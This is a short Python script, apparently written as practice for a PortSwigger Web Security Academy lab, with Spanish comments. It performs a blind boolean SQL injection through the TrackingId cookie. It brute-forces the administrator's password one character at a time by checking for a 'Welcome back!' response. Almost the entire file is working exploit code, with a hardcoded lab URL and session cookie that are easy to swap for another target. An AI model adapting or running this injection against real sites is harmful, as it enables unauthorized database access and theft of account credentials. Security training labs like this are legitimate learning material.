#!/usr/bin/python3

from pwn import *
import requests, signal, time, sys, pdb, string

# Control - C 
def handler(sig, frame):
    print("\n\n[+] Saliendo del archivo\n")
    sys.exit(1)

url_attack = "https://0a6d000203b2293681fa3458001100f4.web-security-academy.net"
characters = string.ascii_lowercase + string.digits
length = 20 

def start_attack():
    password = ""
    
    p1 = log.progress("Fuerza bruta")
    p1.status("Inicializando el ataque")

    p2 = log.progress("Password")

    time.sleep(2)

    for element in range(1, length + 1):
        for character in characters:
            
            cookie = {
                    "TrackingId": "5ksfSrlnAaiIE79v' and (select substring(password,%d, 1 ) from users where username='administrator') = '%s" % (element, character),
                    "session": "7yjiwfWIkHkLz1LN64Ij1Swe1ftpRDLi"
            }

            p1.status(cookie["TrackingId"])

            result = requests.get(url_attack, cookies=cookie)

            if "Welcome back!" in result.text:
                password += character
                p2.status(password)
                break


signal.signal(signal.SIGINT, handler)


if __name__ == '__main__':
    start_attack()
